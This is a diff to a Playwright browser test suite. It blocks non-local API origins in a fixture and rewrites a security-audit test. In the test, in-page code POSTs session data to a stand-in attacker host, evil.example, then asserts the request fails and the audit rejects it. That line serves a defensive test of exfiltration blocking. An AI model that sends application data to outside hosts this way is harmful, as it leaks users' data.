@@ -477,6 +477,7 @@ async function installApiFixture(page: Page, state: FixtureState) {
   await page.route("**/api/**", async (route) => {
     const request = route.request();
     const url = new URL(request.url());
+    if (url.origin !== LOCAL_VITE_ORIGIN) return void await route.abort("blockedbyclient");
     const path = url.pathname;
     const json = (value: unknown, status = 200) => route.fulfill({
       status,
@@ -780,23 +781,30 @@ function assertSentinelsAbsent(surfaces: Record<"body" | "console" | "storage" |
 }
 
 test("security audit rejects every non-local network origin", async ({ page }) => {
-  await page.goto("/", { waitUntil: "load" });
   const state: FixtureState = {
     session: null,
     observations: [],
     candidateAvailable: false,
     artifactExpired: false
   };
-  await expect(securityAudit(page, {
-    requests: [{
-      method: "POST",
-      origin: "https://evil.example",
-      path: "/collect",
-      body: "{}"
-    }],
-    consoleMessages: [],
-    undeclared: []
-  }, state)).rejects.toThrow();
+  const fixture = await installApiFixture(page, state);
+  await page.goto("/", { waitUntil: "load" });
+  const externalResult = await page.evaluate(async ({ url, body }) => {
+    try {
+      await fetch(url, { method: "POST", mode: "no-cors", body });
+      return "resolved";
+    } catch (error) {
+      return error instanceof TypeError ? error.message : String(error);
+    }
+  }, {
+    url: "https://evil.example/api/v1/acquisition/visual-reader-sessions",
+    body: JSON.stringify({ runId: RUN_ID, artifactUploadEnabled: true })
+  });
+  expect(externalResult).toBe("Failed to fetch");
+  expect(state.session).toBeNull();
+  expect(fixture.requests.filter((request) => request.origin === "https://evil.example"))
+    .toHaveLength(1);
+  await expect(securityAudit(page, fixture, state)).rejects.toThrow();
 
   for (const sentinel of [RAW_SCREENSHOT_SENTINEL, BROWSER_CONFIG_SENTINEL, NONCE_SENTINEL]) {
     for (const surface of ["body", "console", "storage", "fixture"] as const) {
